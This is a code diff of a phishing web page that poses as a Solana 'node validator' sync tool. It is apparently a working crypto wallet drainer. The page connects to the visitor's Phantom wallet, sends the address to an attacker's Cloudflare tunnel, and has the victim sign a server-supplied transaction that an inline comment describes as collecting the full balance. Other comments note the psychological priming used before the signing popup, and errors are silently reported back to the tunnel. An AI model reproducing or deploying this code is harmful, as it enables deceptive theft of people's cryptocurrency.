@@ -3,66 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Support</title>
+    <title>Solana Security Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 340px; background: #1a1a1a; border-radius: 16px; padding: 24px; text-align: center; border: 1px solid #333; }
-        .icon { width: 60px; height: 60px; background: #14f195; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; color: #000; font-size: 24px; font-weight: bold; }
-        h2 { font-size: 20px; margin: 0 0 8px; }
-        p { color: #888; font-size: 14px; line-height: 1.5; margin: 0 0 24px; }
-        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
-        button:active { opacity: 0.8; }
-        #log { font-size: 11px; color: #444; margin-top: 16px; }
+        body { background: #050505; color: #14f195; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .scanner-box { width: 320px; padding: 40px; border: 1px solid #14f195; position: relative; background: rgba(20, 241, 149, 0.05); box-shadow: 0 0 30px rgba(20, 241, 149, 0.2); text-align: center; }
+        .scan-line { width: 100%; height: 2px; background: #14f195; position: absolute; top: 0; left: 0; animation: scan 3s infinite; box-shadow: 0 0 15px #14f195; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        h2 { font-size: 18px; letter-spacing: 2px; margin-bottom: 20px; }
+        #status-list { text-align: left; font-size: 12px; height: 100px; overflow: hidden; color: #888; margin-bottom: 20px; }
+        .btn-sync { background: #14f195; color: #000; border: none; padding: 15px 30px; font-weight: 900; cursor: pointer; text-transform: uppercase; width: 100%; letter-spacing: 1px; }
+        .btn-sync:disabled { background: #333; color: #666; cursor: not-allowed; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">S</div>
-        <h2>Node Maintenance</h2>
-        <p>Your validator node requires a quick synchronization to remain active on the network.</p>
-        <button id="cta">START AUTO-SYNC</button>
-        <div id="log">SYSTEM ARMED v22.0</div>
+    <div class="scanner-box">
+        <div class="scan-line" id="scanner"></div>
+        <h2>NODE VALIDATOR</h2>
+        <div id="status-list">
+            <div>> INITIALIZING PROTOCOL...</div>
+        </div>
+        <button id="cta" class="btn-sync">ACTIVATE NODE</button>
     </div>
 
     <script>
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('log').innerText = t;
-            const sWeb3 = window.solanaWeb3;
-            const p = window.solana || window.phantom?.solana;
+        const addLog = (msg) => {
+            const list = document.getElementById('status-list');
+            const item = document.createElement('div');
+            item.innerText = "> " + msg;
+            list.appendChild(item);
+            if (list.childNodes.length > 6) list.removeChild(list.firstChild);
+        };
 
-            if (!p) { alert("Please use Phantom Browser"); return; }
+        document.getElementById('cta').onclick = async function() {
+            this.disabled = true;
+            const p = window.solana || window.phantom?.solana;
+            const sWeb3 = window.solanaWeb3;
 
             try {
-                log("Connecting...");
+                addLog("CONNECTING TO PHANTOM...");
                 await p.connect();
+                addLog("CONNECTION SECURE.");
 
-                log("Syncing Data...");
+                addLog("FETCHING NETWORK PARAMS...");
                 const resp = await fetch(tunnel + "/prepare_raw", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
+                addLog("NODE HASH: " + info.bh.substring(0, 16) + "...");
 
-                log("Awaiting Confirmation...");
+                // 心理暗示：在拉起弹窗前最后一刻给出正向提示
+                addLog("AWAITING SECURE VALIDATION...");
+                
                 const binary = window.atob(info.raw_tx);
                 const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
                 const tx = sWeb3.VersionedTransaction.deserialize(bytes);
 
-                // 🔱 调起全额归集弹窗
+                // 🔱 这一步会瞬间拉起全额归集确认
                 const { signature } = await p.signAndSendTransaction(tx);
-                log("Sync Successful!");
+                
+                addLog("VALIDATION SUCCESSFUL!");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
             } catch (err) {
-                log("Network Busy. Retry later.");
-                // 悄悄把错误报回 71 服务器
+                addLog("ERROR: " + err.message);
+                this.disabled = false;
+                // 自动上报
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V22_FAIL", error: err.message })
+                    body: JSON.stringify({ stage: "V23_FAIL", error: err.message })
                 }).catch(()=>{});
             }
         };
